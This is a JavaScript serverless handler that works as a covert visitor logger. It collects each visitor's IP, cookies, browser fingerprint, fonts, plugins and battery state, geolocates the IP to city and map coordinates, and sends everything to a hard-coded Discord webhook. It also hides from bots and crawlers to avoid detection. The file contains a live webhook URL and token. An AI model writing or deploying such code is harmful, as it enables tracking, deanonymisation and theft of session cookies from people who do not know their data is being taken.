const axios = require('axios');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || '';

        // Skip bots (HeadlessChrome, crawlers, etc.)
        const isBot = /headless|bot|crawler|spider|curl|wget|python|java/i.test(userAgent);
        if (isBot) {
            console.log('🤖 Bot ignored');
            return res.status(200).json({ status: 'ok', filtered: true });
        }

        const clientData = req.body || {};

        // Geo lookup
        let geo = {};
        try {
            const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,timezone`, { timeout: 3000 });
            if (geoRes.data.status === 'success') geo = geoRes.data;
        } catch (e) {}

        const embed = {
            title: '🎯 New Visitor',
            color: 0xff0044,
            fields: [
                { name: 'IP', value: ip, inline: true },
                { name: 'User Agent', value: (userAgent).substring(0, 100), inline: true },
                { name: 'Referer', value: (clientData.referrer || 'Direct').substring(0, 100), inline: true },
                { name: 'Screen', value: clientData.screen || 'Unknown', inline: true },
                { name: 'Platform', value: clientData.platform || 'Unknown', inline: true },
                { name: 'Language', value: clientData.language || 'Unknown', inline: true },
                { name: 'Timezone', value: clientData.timezone || 'Unknown', inline: true },
                { name: 'Memory (GB)', value: clientData.memory || 'Unknown', inline: true },
                { name: 'Battery', value: clientData.battery || 'Unknown', inline: true },
                { name: 'Cookies', value: (clientData.cookies || 'none').substring(0, 200), inline: false },
                { name: 'Plugins', value: (clientData.plugins || 'none').substring(0, 200), inline: false },
                { name: 'Fonts', value: (clientData.fonts || 'none').substring(0, 200), inline: false },
                { name: 'Fingerprint', value: (clientData.fingerprint || 'none').substring(0, 200), inline: false },
                { name: 'URL', value: (clientData.url || 'Unknown').substring(0, 150), inline: false },
                { name: 'Time', value: new Date().toISOString(), inline: true },
            ],
            timestamp: new Date().toISOString(),
        };

        if (geo.country) {
            embed.fields.push({ name: '📍 Location', value: `${geo.city}, ${geo.regionName}, ${geo.country} (${geo.zip})`, inline: false });
            if (geo.lat && geo.lon) embed.fields.push({ name: '🗺️ Map', value: `https://www.openstreetmap.org/?mlat=${geo.lat}&mlon=${geo.lon}&zoom=15`, inline: false });
            if (geo.isp) embed.fields.push({ name: 'ISP', value: geo.isp, inline: true });
            if (geo.org) embed.fields.push({ name: 'Organization', value: geo.org, inline: true });
        }

        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
        await axios.post(WEBHOOK_URL, { embeds: [embed] });

        res.status(200).json({ status: 'ok' });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Internal error' });
    }
};